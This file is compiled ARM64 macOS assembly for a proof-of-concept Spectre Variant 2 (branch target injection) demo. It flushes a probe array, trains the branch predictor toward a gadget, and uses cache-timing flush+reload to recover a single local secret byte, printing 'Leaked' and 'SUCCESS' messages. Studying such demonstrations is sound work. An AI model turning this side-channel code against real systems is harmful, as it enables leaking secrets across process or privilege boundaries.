	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 15, 0	sdk_version 15, 5
	.globl	_flush_probe_array              ; -- Begin function flush_probe_array
	.p2align	2
_flush_probe_array:                     ; @flush_probe_array
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #32
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	add	x29, sp, #16
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	stur	wzr, [x29, #-4]
	b	LBB0_1
LBB0_1:                                 ; =>This Inner Loop Header: Depth=1
	ldur	w8, [x29, #-4]
	subs	w8, w8, #256
	b.ge	LBB0_4
	b	LBB0_2
LBB0_2:                                 ;   in Loop: Header=BB0_1 Depth=1
	ldur	w8, [x29, #-4]
	lsl	w9, w8, #6
	adrp	x8, _probe_array@GOTPAGE
	ldr	x8, [x8, _probe_array@GOTPAGEOFF]
	add	x0, x8, w9, sxtw
	bl	_arm64_clflush
	b	LBB0_3
LBB0_3:                                 ;   in Loop: Header=BB0_1 Depth=1
	ldur	w8, [x29, #-4]
	add	w8, w8, #1
	stur	w8, [x29, #-4]
	b	LBB0_1
LBB0_4:
	bl	_arm64_mfence
	ldp	x29, x30, [sp, #16]             ; 16-byte Folded Reload
	add	sp, sp, #32
	ret
	.cfi_endproc
                                        ; -- End function
	.p2align	2                               ; -- Begin function arm64_clflush
_arm64_clflush:                         ; @arm64_clflush
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #16
	.cfi_def_cfa_offset 16
	str	x0, [sp, #8]
	ldr	x8, [sp, #8]
	; InlineAsm Start
	dc	civac, x8
	; InlineAsm End
	add	sp, sp, #16
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_measure_access_time            ; -- Begin function measure_access_time
	.p2align	2
_measure_access_time:                   ; @measure_access_time
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #48
	stp	x29, x30, [sp, #32]             ; 16-byte Folded Spill
	add	x29, sp, #32
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	stur	x0, [x29, #-8]
	bl	_get_time_ns
	str	x0, [sp, #16]
	ldur	x8, [x29, #-8]
	ldrb	w8, [x8]
	strb	w8, [sp, #7]
	bl	_arm64_mfence
	bl	_get_time_ns
	str	x0, [sp, #8]
	ldr	x8, [sp, #8]
	ldr	x9, [sp, #16]
	subs	x0, x8, x9
	ldp	x29, x30, [sp, #32]             ; 16-byte Folded Reload
	add	sp, sp, #48
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_benign_target                  ; -- Begin function benign_target
	.p2align	2
_benign_target:                         ; @benign_target
	.cfi_startproc
; %bb.0:
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_common_init                    ; -- Begin function common_init
	.p2align	2
_common_init:                           ; @common_init
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #32
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	add	x29, sp, #16
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	mov	x1, #16384                      ; =0x4000
	adrp	x0, _probe_array@GOTPAGE
	ldr	x0, [x0, _probe_array@GOTPAGEOFF]
	bl	_bzero
	stur	wzr, [x29, #-4]
	b	LBB4_1
LBB4_1:                                 ; =>This Inner Loop Header: Depth=1
	ldur	w8, [x29, #-4]
	subs	w8, w8, #4, lsl #12             ; =16384
	b.ge	LBB4_4
	b	LBB4_2
LBB4_2:                                 ;   in Loop: Header=BB4_1 Depth=1
	ldursw	x9, [x29, #-4]
	adrp	x8, _probe_array@GOTPAGE
	ldr	x8, [x8, _probe_array@GOTPAGEOFF]
	add	x9, x8, x9
	mov	w8, #1                          ; =0x1
	strb	w8, [x9]
	b	LBB4_3
LBB4_3:                                 ;   in Loop: Header=BB4_1 Depth=1
	ldur	w8, [x29, #-4]
	add	w8, w8, #64
	stur	w8, [x29, #-4]
	b	LBB4_1
LBB4_4:
	bl	_arm64_mfence
	bl	_flush_probe_array
	bl	_arm64_mfence
	ldp	x29, x30, [sp, #16]             ; 16-byte Folded Reload
	add	sp, sp, #32
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_perform_measurement            ; -- Begin function perform_measurement
	.p2align	2
_perform_measurement:                   ; @perform_measurement
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #112
	stp	x29, x30, [sp, #96]             ; 16-byte Folded Spill
	add	x29, sp, #96
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	sturb	w0, [x29, #-5]
	stur	x1, [x29, #-16]
	adrp	x0, l_.str@PAGE
	add	x0, x0, l_.str@PAGEOFF
	bl	_printf
	mov	w8, #-1                         ; =0xffffffff
	stur	w8, [x29, #-20]
	mov	x8, #-1                         ; =0xffffffffffffffff
	stur	x8, [x29, #-32]
	mov	w8, #100                        ; =0x64
	stur	w8, [x29, #-36]
	stur	wzr, [x29, #-40]
	b	LBB5_1
LBB5_1:                                 ; =>This Inner Loop Header: Depth=1
	ldur	w8, [x29, #-40]
	subs	w8, w8, #256
	b.ge	LBB5_8
	b	LBB5_2
LBB5_2:                                 ;   in Loop: Header=BB5_1 Depth=1
	ldur	w8, [x29, #-40]
	lsl	w9, w8, #6
	adrp	x8, _probe_array@GOTPAGE
	ldr	x8, [x8, _probe_array@GOTPAGEOFF]
	add	x8, x8, w9, sxtw
	str	x8, [sp, #48]
	ldr	x0, [sp, #48]
	bl	_measure_access_time
	str	x0, [sp, #40]
	ldr	x8, [sp, #40]
	ldursw	x9, [x29, #-36]
	subs	x8, x8, x9
	b.ge	LBB5_6
	b	LBB5_3
LBB5_3:                                 ;   in Loop: Header=BB5_1 Depth=1
	ldur	x8, [x29, #-32]
	adds	x8, x8, #1
	b.eq	LBB5_5
	b	LBB5_4
LBB5_4:                                 ;   in Loop: Header=BB5_1 Depth=1
	ldr	x8, [sp, #40]
	ldur	x9, [x29, #-32]
	subs	x8, x8, x9
	b.ge	LBB5_6
	b	LBB5_5
LBB5_5:                                 ;   in Loop: Header=BB5_1 Depth=1
	ldr	x8, [sp, #40]
	stur	x8, [x29, #-32]
	ldur	w8, [x29, #-40]
	stur	w8, [x29, #-20]
	b	LBB5_6
LBB5_6:                                 ;   in Loop: Header=BB5_1 Depth=1
	b	LBB5_7
LBB5_7:                                 ;   in Loop: Header=BB5_1 Depth=1
	ldur	w8, [x29, #-40]
	add	w8, w8, #1
	stur	w8, [x29, #-40]
	b	LBB5_1
LBB5_8:
	ldur	w8, [x29, #-20]
	adds	w8, w8, #1
	b.eq	LBB5_12
	b	LBB5_9
LBB5_9:
	ldur	x11, [x29, #-16]
	ldur	w12, [x29, #-20]
	ldur	w8, [x29, #-20]
	mov	x10, x8
	ldur	x8, [x29, #-32]
	mov	x9, sp
	str	x11, [x9]
                                        ; implicit-def: $x11
	mov	x11, x12
	sxtb	x11, w11
	str	x11, [x9, #8]
	str	x10, [x9, #16]
	str	x8, [x9, #24]
	adrp	x0, l_.str.1@PAGE
	add	x0, x0, l_.str.1@PAGEOFF
	bl	_printf
	ldur	w8, [x29, #-20]
	ldurb	w9, [x29, #-5]
	subs	w8, w8, w9
	b.ne	LBB5_11
	b	LBB5_10
LBB5_10:
	ldur	x8, [x29, #-16]
	mov	x9, sp
	str	x8, [x9]
	adrp	x0, l_.str.2@PAGE
	add	x0, x0, l_.str.2@PAGEOFF
	bl	_printf
	mov	w8, #1                          ; =0x1
	stur	w8, [x29, #-4]
	b	LBB5_13
LBB5_11:
	ldur	x8, [x29, #-16]
	mov	x9, sp
	str	x8, [x9]
	adrp	x0, l_.str.3@PAGE
	add	x0, x0, l_.str.3@PAGEOFF
	bl	_printf
	stur	wzr, [x29, #-4]
	b	LBB5_13
LBB5_12:
	ldur	x8, [x29, #-16]
	mov	x9, sp
	str	x8, [x9]
	adrp	x0, l_.str.4@PAGE
	add	x0, x0, l_.str.4@PAGEOFF
	bl	_printf
	stur	wzr, [x29, #-4]
	b	LBB5_13
LBB5_13:
	ldur	w0, [x29, #-4]
	ldp	x29, x30, [sp, #96]             ; 16-byte Folded Reload
	add	sp, sp, #112
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_speculative_gadget_v2          ; -- Begin function speculative_gadget_v2
	.p2align	2
_speculative_gadget_v2:                 ; @speculative_gadget_v2
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #16
	.cfi_def_cfa_offset 16
	strb	w0, [sp, #15]
	ldrb	w8, [sp, #15]
	lsl	w9, w8, #6
	adrp	x8, _probe_array@GOTPAGE
	ldr	x8, [x8, _probe_array@GOTPAGEOFF]
	add	x9, x8, w9, sxtw
	mov	w8, #1                          ; =0x1
	strb	w8, [x9]
	add	sp, sp, #16
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_architectural_target_v2        ; -- Begin function architectural_target_v2
	.p2align	2
_architectural_target_v2:               ; @architectural_target_v2
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #32
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	add	x29, sp, #16
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	sturb	w0, [x29, #-1]
	ldurb	w10, [x29, #-1]
	mov	x9, sp
                                        ; implicit-def: $x8
	mov	x8, x10
	str	x8, [x9]
	adrp	x0, l_.str.5@PAGE
	add	x0, x0, l_.str.5@PAGEOFF
	bl	_printf
	ldp	x29, x30, [sp, #16]             ; 16-byte Folded Reload
	add	sp, sp, #32
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_main_spectre_v2                ; -- Begin function main_spectre_v2
	.p2align	2
_main_spectre_v2:                       ; @main_spectre_v2
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #64
	stp	x29, x30, [sp, #48]             ; 16-byte Folded Spill
	add	x29, sp, #48
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	bl	_common_init
	adrp	x0, l_.str.6@PAGE
	add	x0, x0, l_.str.6@PAGEOFF
	bl	_printf
	mov	w8, #84                         ; =0x54
	sturb	w8, [x29, #-1]
	adrp	x0, l_.str.7@PAGE
	add	x0, x0, l_.str.7@PAGEOFF
	bl	_printf
	adrp	x8, _speculative_gadget_v2@PAGE
	add	x8, x8, _speculative_gadget_v2@PAGEOFF
	stur	x8, [x29, #-16]
	stur	wzr, [x29, #-20]
	b	LBB8_1
LBB8_1:                                 ; =>This Inner Loop Header: Depth=1
	ldur	w8, [x29, #-20]
	mov	w9, #5000                       ; =0x1388
	subs	w8, w8, w9
	b.ge	LBB8_4
	b	LBB8_2
LBB8_2:                                 ;   in Loop: Header=BB8_1 Depth=1
	ldur	x8, [x29, #-16]
	; InlineAsm Start
	blr	x8
	dsb	sy
	dsb	ld

	; InlineAsm End
	b	LBB8_3
LBB8_3:                                 ;   in Loop: Header=BB8_1 Depth=1
	ldur	w8, [x29, #-20]
	add	w8, w8, #1
	stur	w8, [x29, #-20]
	b	LBB8_1
LBB8_4:
	bl	_arm64_mfence
	bl	_flush_probe_array
	bl	_arm64_lfence
	adrp	x0, l_.str.8@PAGE
	add	x0, x0, l_.str.8@PAGEOFF
	bl	_printf
	adrp	x8, _architectural_target_v2@PAGE
	add	x8, x8, _architectural_target_v2@PAGEOFF
	str	x8, [sp, #16]
	ldr	x8, [sp, #16]
	ldurb	w0, [x29, #-1]
	blr	x8
	bl	_arm64_lfence
	ldurb	w0, [x29, #-1]
	adrp	x1, l_.str.9@PAGE
	add	x1, x1, l_.str.9@PAGEOFF
	bl	_perform_measurement
	ldurb	w10, [x29, #-1]
	mov	x9, sp
                                        ; implicit-def: $x8
	mov	x8, x10
	str	x8, [x9]
	adrp	x0, l_.str.10@PAGE
	add	x0, x0, l_.str.10@PAGEOFF
	bl	_printf
	mov	w0, #0                          ; =0x0
	ldp	x29, x30, [sp, #48]             ; 16-byte Folded Reload
	add	sp, sp, #64
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_main                           ; -- Begin function main
	.p2align	2
_main:                                  ; @main
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #32
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	add	x29, sp, #16
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	stur	wzr, [x29, #-4]
	bl	_main_spectre_v2
	ldp	x29, x30, [sp, #16]             ; 16-byte Folded Reload
	add	sp, sp, #32
	ret
	.cfi_endproc
                                        ; -- End function
	.p2align	2                               ; -- Begin function arm64_mfence
_arm64_mfence:                          ; @arm64_mfence
	.cfi_startproc
; %bb.0:
	; InlineAsm Start
	dsb	sy
	; InlineAsm End
	ret
	.cfi_endproc
                                        ; -- End function
	.p2align	2                               ; -- Begin function get_time_ns
_get_time_ns:                           ; @get_time_ns
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #32
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	add	x29, sp, #16
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	mov	w0, #6                          ; =0x6
	mov	x1, sp
	bl	_clock_gettime
	ldr	x8, [sp]
	mov	x9, #51712                      ; =0xca00
	movk	x9, #15258, lsl #16
	mul	x8, x8, x9
	ldr	x9, [sp, #8]
	add	x0, x8, x9
	ldp	x29, x30, [sp, #16]             ; 16-byte Folded Reload
	add	sp, sp, #32
	ret
	.cfi_endproc
                                        ; -- End function
	.p2align	2                               ; -- Begin function arm64_lfence
_arm64_lfence:                          ; @arm64_lfence
	.cfi_startproc
; %bb.0:
	; InlineAsm Start
	dsb	ld
	; InlineAsm End
	ret
	.cfi_endproc
                                        ; -- End function
	.comm	_probe_array,16384,0            ; @probe_array
	.section	__TEXT,__cstring,cstring_literals
l_.str:                                 ; @.str
	.asciz	"Measuring cache timings...\n"

l_.str.1:                               ; @.str.1
	.asciz	"Leaked %s (speculatively): %c (ASCII %d), Access Time: %lld ns\n"

l_.str.2:                               ; @.str.2
	.asciz	"SUCCESS! Leaked the actual %s.\n"

l_.str.3:                               ; @.str.3
	.asciz	"LEAKED VALUE DOES NOT MATCH ACTUAL %s.\n"

l_.str.4:                               ; @.str.4
	.asciz	"No %s leaked or could not detect leakage.\n"

l_.str.5:                               ; @.str.5
	.asciz	"Architectural execution reached benign target with value %d.\n"

l_.str.6:                               ; @.str.6
	.asciz	"\n--- Running Spectre Variant 2 (Branch Target Injection) Demo ---\n"

l_.str.7:                               ; @.str.7
	.asciz	"Poisoning BTB with speculative gadget address...\n"

l_.str.8:                               ; @.str.8
	.asciz	"Triggering victim indirect call with architectural target...\n"

l_.str.9:                               ; @.str.9
	.asciz	"Spectre V2 secret"

l_.str.10:                              ; @.str.10
	.asciz	"Actual secret data: %c\n"

.subsections_via_symbols
